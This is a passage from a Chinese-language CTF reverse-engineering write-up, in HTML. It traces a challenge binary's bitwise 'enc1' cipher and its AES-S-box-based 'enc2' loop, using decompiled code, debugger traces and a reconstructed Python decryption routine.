*rsi_;</span><br><span class="line">    a1[<span class="number">2</span>] = rsi_[<span class="number">1</span>];</span><br><span class="line">    a1[<span class="number">3</span>] = rsi_[<span class="number">2</span>];</span><br><span class="line">    a1[<span class="number">4</span>] = rsi_[<span class="number">3</span>];</span><br><span class="line">    a1[<span class="number">5</span>] = rsi_[<span class="number">4</span>];</span><br><span class="line">    a1[<span class="number">6</span>] = rsi_[<span class="number">5</span>];</span><br><span class="line">    a1[<span class="number">7</span>] = rsi_[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用条件断点获取函数的输入输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">*****enc1 while1*****</span><br><span class="line">get_input:102</span><br><span class="line">	get_num:52</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:52 &amp; 0x0 = 0	0</span><br><span class="line">	op:0 ^ 0 = 0	0</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:52 &lt;&lt; 1 = 104	104</span><br><span class="line">	op:104 ^ 0 = 104	104</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:104 &amp; 0xff = 104	104</span><br><span class="line">	op:0 ^ 104 = 104	104</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:104 &lt;&lt; 1 = 208	208</span><br><span class="line">	op:208 ^ 0 = 208	208</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:208 &amp; 0xff = 208	208</span><br><span class="line">	op:104 ^ 208 = 184	184</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:208 &lt;&lt; 1 = 160	160</span><br><span class="line">	op:160 ^ 99 = 195	195</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:195 &amp; 0x0 = 0	0</span><br><span class="line">	op:184 ^ 0 = 184	184</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:195 &lt;&lt; 1 = 134	134</span><br><span class="line">	op:134 ^ 99 = 229	229</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:229 &amp; 0x0 = 0	0</span><br><span class="line">	op:184 ^ 0 = 184	184</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:229 &lt;&lt; 1 = 202	202</span><br><span class="line">	op:202 ^ 99 = 169	169</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:169 &amp; 0xff = 169	169</span><br><span class="line">	op:184 ^ 169 = 17	17</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:169 &lt;&lt; 1 = 82	82</span><br><span class="line">	op:82 ^ 99 = 49	49</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:49 &amp; 0xff = 49	49</span><br><span class="line">	op:17 ^ 49 = 32	32</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:49 &lt;&lt; 1 = 98	98</span><br><span class="line">	op:98 ^ 0 = 98	98</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:98 &amp; 0x0 = 0	0</span><br><span class="line">	op:32 ^ 0 = 32	32</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:98 &lt;&lt; 1 = 196	196</span><br><span class="line">	op:196 ^ 0 = 196	196</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	op:32 ^ 227 = 195	195</span><br><span class="line">*enc1 while1 end*****</span><br><span class="line">*****enc1 while1*****</span><br><span class="line">get_input:80</span><br><span class="line">	get_num:52</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:52 &amp; 0x0 = 0	0</span><br><span class="line">	op:0 ^ 0 = 0	0</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:52 &lt;&lt; 1 = 104	104</span><br><span class="line">	op:104 ^ 0 = 104	104</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:104 &amp; 0x0 = 0	0</span><br><span class="line">	op:0 ^ 0 = 0	0</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:104 &lt;&lt; 1 = 208	208</span><br><span class="line">	op:208 ^ 0 = 208	208</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:208 &amp; 0x0 = 0	0</span><br><span class="line">	op:0 ^ 0 = 0	0</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:208 &lt;&lt; 1 = 160	160</span><br><span class="line">	op:160 ^ 99 = 195	195</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:195 &amp; 0x0 = 0	0</span><br><span class="line">	op:0 ^ 0 = 0	0</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:195 &lt;&lt; 1 = 134	134</span><br><span class="line">	op:134 ^ 99 = 229	229</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:229 &amp; 0xff = 229	229</span><br><span class="line">	op:0 ^ 229 = 229	229</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:229 &lt;&lt; 1 = 202	202</span><br><span class="line">	op:202 ^ 99 = 169	169</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:169 &amp; 0x0 = 0	0</span><br><span class="line">	op:229 ^ 0 = 229	229</span><br><span class="line">	op:99 &amp; 0xff = 99	99</span><br><span class="line">	op:169 &lt;&lt; 1 = 82	82</span><br><span class="line">	op:82 ^ 99 = 49	49</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:49 &amp; 0xff = 49	49</span><br><span class="line">	op:229 ^ 49 = 212	212</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:49 &lt;&lt; 1 = 98	98</span><br><span class="line">	op:98 ^ 0 = 98	98</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	enc1 while1*****</span><br><span class="line">	op:98 &amp; 0x0 = 0	0</span><br><span class="line">	op:212 ^ 0 = 212	212</span><br><span class="line">	op:99 &amp; 0x0 = 0	0</span><br><span class="line">	op:98 &lt;&lt; 1 = 196	196</span><br><span class="line">	op:196 ^ 0 = 196	196</span><br><span class="line">	enc1 while1 end*</span><br><span class="line">	op:212 ^ 227 = 55	55</span><br><span class="line">*enc1 while1 end*****</span><br></pre></td></tr></table></figure>

<p>输入是<code>fP</code>，这里只放了前两个输入的加密。</p>
<p>这里每个输入的加密除了获取输入那里就不在其他地方出现了🤮</p>
<p>动调（把输入字符转化的<code>0x80000000</code>、<code>0x00000000</code>改为明显的其他数，不然好难调🤮）发现<code>enc1</code>是按bit处理的。</p>
<p>继续动调，结合上面函数输出输入的过程，获得逻辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_andbit</span>(<span class="params">num</span>):</span><br><span class="line">    res = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">        res[<span class="number">0</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">2</span>) == <span class="number">2</span>:</span><br><span class="line">        res[<span class="number">1</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">4</span>) == <span class="number">4</span>:</span><br><span class="line">        res[<span class="number">2</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">8</span>) == <span class="number">8</span>:</span><br><span class="line">        res[<span class="number">3</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">16</span>) == <span class="number">16</span>:</span><br><span class="line">        res[<span class="number">4</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">32</span>) == <span class="number">32</span>:</span><br><span class="line">        res[<span class="number">5</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">64</span>) == <span class="number">64</span>:</span><br><span class="line">        res[<span class="number">6</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> (num &amp; <span class="number">128</span>) == <span class="number">128</span>:</span><br><span class="line">        res[<span class="number">7</span>] = <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    c_and_bit = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        e = <span class="number">52</span></span><br><span class="line">        b = <span class="number">0</span></span><br><span class="line">        bit = get_andbit(data[i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            a = e &amp; bit[j]</span><br><span class="line">            b = b ^ a</span><br><span class="line">            c = <span class="number">99</span> &amp; c_and_bit[j]</span><br><span class="line">            e = (e &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line">            e = e ^ c</span><br><span class="line">        data[i] = b ^ <span class="number">227</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>

<h3 id="enc2"><a href="#enc2" class="headerlink" title="enc2"></a>enc2</h3><p><code>enc2</code>中进行了四次循环加密，循环主体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v2 = &amp;input_char_byte;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        ------------<span class="keyword">asm</span>------------</span><br><span class="line">            <span class="comment">// 加数：rsi = 上轮循环最后的加法结果</span></span><br><span class="line">            mov     rsi, [rsp+<span class="number">0B</span>8h+var_B0]</span><br><span class="line">            <span class="comment">// r11d 是循环的index， rax是获取input的index</span></span><br><span class="line">            add     r11d, <span class="number">1</span></span><br><span class="line">            <span class="comment">// 被加数：rdx = r8(从input[0]起始，每轮r8+=0x20，即input[index])</span></span><br><span class="line">            mov     rdx, r8</span><br><span class="line">            mov     rdi, rcx</span><br><span class="line">            mov     [rsp+<span class="number">0B</span>8h+var_68], <span class="number">0</span></span><br><span class="line">            mov     eax, r11d</span><br><span class="line">            mov     qword ptr [rsp+<span class="number">0B</span>8h+var_60], <span class="number">0</span></span><br><span class="line">            and     eax, <span class="number">7</span></span><br><span class="line">            mov     qword ptr [rsp+<span class="number">0B</span>8h+var_60+<span class="number">8</span>], <span class="number">0</span></span><br><span class="line">            shl     rax, <span class="number">5</span></span><br><span class="line">            mov     [rsp+<span class="number">0B</span>8h+var_50], <span class="number">0</span></span><br><span class="line">            add     rax, r13</span><br><span class="line">            call    add_operation</span><br><span class="line">        ------------<span class="keyword">asm</span>------------</span><br><span class="line">        v90 = <span class="number">0LL</span>;</span><br><span class="line">        v91 = <span class="number">0uLL</span>;</span><br><span class="line">        v92 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="comment">// input[8 * i + index] + input[8 * i + rax_ + 8]</span></span><br><span class="line">        add_operation(v1, &amp;v87, v2);</span><br><span class="line">        v87 = v90;</span><br><span class="line">        v3 = DWORD2(v91);</span><br><span class="line">        *v88 = v91;</span><br><span class="line">        *&amp;v88[<span class="number">16</span>] = v92;</span><br><span class="line">        v4 = v92 &gt;= <span class="number">0</span>;</span><br><span class="line">        v91 = <span class="number">0uLL</span>;</span><br><span class="line">        v5 = v92 &gt;= <span class="number">0</span>;</span><br><span class="line">        v92 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = (<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * ((<span class="number">2</span> * v4) | v5)) | (*&amp;v88[<span class="number">12</span>] &gt;= <span class="number">0</span>))) | (v3 &gt;= <span class="number">0</span>))) | (*&amp;v88[<span class="number">4</span>] &gt;= <span class="number">0</span>))) | (*v88 &gt;= <span class="number">0</span>))) | (v90 &gt;= <span class="number">0</span>);</span><br><span class="line">        v7 = v90;</span><br><span class="line">        v90 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="comment">// 取sbox里的值</span></span><br><span class="line">        parse_num(v9, *(aes_sbox + ((<span class="number">2</span> * v6) | (v7 &gt;= <span class="number">0</span>))));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v89, <span class="number">0</span>, <span class="keyword">sizeof</span>(v89));</span><br><span class="line">        add_operation(v12, v11, v10);</span><br><span class="line">        v13 = v89.m256_f32[<span class="number">0</span>];</span><br><span class="line">        v14 = v89.m256_f32[<span class="number">2</span>];</span><br><span class="line">        v15 = v89.m256_f32[<span class="number">3</span>];</span><br><span class="line">        v16 = v89.m256_f32[<span class="number">4</span>];</span><br><span class="line">        v17 = v89.m256_f32[<span class="number">5</span>];</span><br><span class="line">        v18 = v89.m256_f32[<span class="number">6</span>];</span><br><span class="line">        v19 = v89.m256_f32[<span class="number">1</span>];</span><br><span class="line">        *&amp;v88[<span class="number">8</span>] = *&amp;v89.m256_f32[<span class="number">3</span>];</span><br><span class="line">        *v88 = *&amp;v89.m256_f32[<span class="number">1</span>];</span><br><span class="line">        v87 = __PAIR64__(LODWORD(v89.m256_f32[<span class="number">0</span>]), LODWORD(v89.m256_f32[<span class="number">7</span>]));</span><br><span class="line">        *v20 = v89.m256_f32[<span class="number">7</span>];</span><br><span class="line">        v20[<span class="number">1</span>] = v13;</span><br><span class="line">        v20[<span class="number">2</span>] = v19;</span><br><span class="line">        v20[<span class="number">3</span>] = v14;</span><br><span class="line">        v20[<span class="number">4</span>] = v15;</span><br><span class="line">        v20[<span class="number">5</span>] = v16;</span><br><span class="line">        v20[<span class="number">6</span>] = v17;</span><br><span class="line">        v20[<span class="number">7</span>] = v18;</span><br><span class="line">        ------------<span class="keyword">asm</span>------------</span><br><span class="line">            <span class="comment">// 这里将加法结果的值左移一位，放入[rax]、[rsp+0B8h+var_A8]</span></span><br><span class="line">            movss   xmm0, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">1</span>Ch]</span><br><span class="line">            movss   xmm7, dword ptr [rsp+<span class="number">0B</span>8h+var_88]</span><br><span class="line">            movss   xmm5, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">8</span>]</span><br><span class="line">            movss   xmm4, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">0</span>Ch]</span><br><span class="line">            movss   xmm3, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">10</span>h]</span><br><span class="line">            movss   xmm2, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">14</span>h]</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A8], xmm7</span><br><span class="line">            movss   xmm1, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">18</span>h]</span><br><span class="line">            movss   xmm6, dword ptr [rsp+<span class="number">0B</span>8h+var_88+<span class="number">4</span>]</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A8+<span class="number">4</span>], xmm6</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0], xmm5</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">4</span>], xmm4</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">8</span>], xmm3</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">0</span>Ch], xmm2</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">10</span>h], xmm1</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">14</span>h], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">10</span>h], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">14</span>h], xmm1</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">0</span>Ch], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">10</span>h], xmm2</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">8</span>], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">0</span>Ch], xmm3</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">4</span>], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">8</span>], xmm4</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0+<span class="number">4</span>], xmm5</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A8+<span class="number">4</span>], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A0], xmm6</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A8], xmm0</span><br><span class="line">            movss   dword ptr [rsp+<span class="number">0B</span>8h+var_A8+<span class="number">4</span>], xmm7</span><br><span class="line">            movss   dword ptr [rax], xmm0</span><br><span class="line">            movss   dword ptr [rax+<span class="number">4</span>], xmm7</span><br><span class="line">            movss   dword ptr [rax+<span class="number">8</span>], xmm6</span><br><span class="line">            movss   dword ptr [rax+<span class="number">0</span>Ch], xmm5</span><br><span class="line">            movss   dword ptr [rax+<span class="number">10</span>h], xmm4</span><br><span class="line">            movss   dword ptr [rax+<span class="number">14</span>h], xmm3</span><br><span class="line">            movss   dword ptr [rax+<span class="number">18</span>h], xmm2</span><br><span class="line">            movss   dword ptr [rax+<span class="number">1</span>Ch], xmm1</span><br><span class="line">    	------------<span class="keyword">asm</span>------------</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v21 != <span class="number">8</span> );</span><br><span class="line">    --v0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v0 );</span><br></pre></td></tr></table></figure>

<p>主要的<code>add_operation</code>函数，很难看懂：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">add_operation</span><span class="params">(<span class="type">float</span> *a1, <span class="type">float</span> *a2, <span class="type">float</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">   	...</span><br><span class="line">    v3 = -(*a2 - *a3) - (*a3 - *a2);</span><br><span class="line">    v4 = *&amp;dword_557684292478 - v3;</span><br><span class="line">    v5 = -(-v3 - *&amp;dword_557684292478) - (-*a2 - *a3);</span><br><span class="line">    *a1 = -((-(*a2 - *a3) - (*a3 - *a2)) - *&amp;dword_557684292478) - v4;</span><br><span class="line">    v6 = a2[<span class="number">1</span>];</span><br><span class="line">    v7 = a3[<span class="number">1</span>];</span><br><span class="line">    v8 = -(v6 - v7) - (v7 - v6);</span><br><span class="line">    v9 = v5 - v8;</span><br><span class="line">    v10 = -(-v8 - v5) - (-v6 - v7);</span><br><span class="line">    a1[<span class="number">1</span>] = -((-(v6 - v7) - (v7 - v6)) - v5) - v9;</span><br><span class="line">    v11 = a2[<span class="number">2</span>];</span><br><span class="line">    v12 = a3[<span class="number">2</span>];</span><br><span class="line">    v13 = -(v11 - v12) - (v12 - v11);</span><br><span class="line">    v14 = v10 - v13;</span><br><span class="line">    v15 = -(-v13 - v10) - (-v11 - v12);</span><br><span class="line">    a1[<span class="number">2</span>] = -((-(v11 - v12) - (v12 - v11)) - v10) - v14;</span><br><span class="line">    v16 = a2[<span class="number">3</span>];</span><br><span class="line">    v17 = a3[<span class="number">3</span>];</span><br><span class="line">    v18 = -(v16 - v17) - (v17 - v16);</span><br><span class="line">    v19 = v15 - v18;</span><br><span class="line">    v20 = -(-v18 - v15) - (-v16 - v17);</span><br><span class="line">    a1[<span class="number">3</span>] = -((-(v16 - v17) - (v17 - v16)) - v15) - v19;</span><br><span class="line">    v21 = a2[<span class="number">4</span>];</span><br><span class="line">    v22 = a3[<span class="number">4</span>];</span><br><span class="line">    v23 = -(v21 - v22) - (v22 - v21);</span><br><span class="line">    v24 = v20 - v23;</span><br><span class="line">    v25 = -(-v23 - v20) - (-v21 - v22);</span><br><span class="line">    a1[<span class="number">4</span>] = -((-(v21 - v22) - (v22 - v21)) - v20) - v24;</span><br><span class="line">    v26 = a2[<span class="number">5</span>];</span><br><span class="line">    v27 = a3[<span class="number">5</span>];</span><br><span class="line">    v28 = -(v26 - v27) - (v27 - v26);</span><br><span class="line">    v29 = v25 - v28;</span><br><span class="line">    v30 = -(-v28 - v25) - (-v26 - v27);</span><br><span class="line">    a1[<span class="number">5</span>] = -((-(v26 - v27) - (v27 - v26)) - v25) - v29;</span><br><span class="line">    v31 = a2[<span class="number">6</span>];</span><br><span class="line">    v32 = a3[<span class="number">6</span>];</span><br><span class="line">    v33 = -(v31 - v32) - (v32 - v31);</span><br><span class="line">    v34 = v30 - v33;</span><br><span class="line">    v35 = -(-v33 - v30) - (-v31 - v32);</span><br><span class="line">    a1[<span class="number">6</span>] = -((-(v31 - v32) - (v32 - v31)) - v30) - v34;</span><br><span class="line">    v36 = -(a2[<span class="number">7</span>] - a3[<span class="number">7</span>]) - (a3[<span class="number">7</span>] - a2[<span class="number">7</span>]);</span><br><span class="line">    a1[<span class="number">7</span>] = -(v36 - v35) - (v35 - v36);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考了LaoGong的wp（真神✪ ω ✪），可以猜测这个函数是个模<code>0xFF</code>加法操作。</p>
<blockquote>
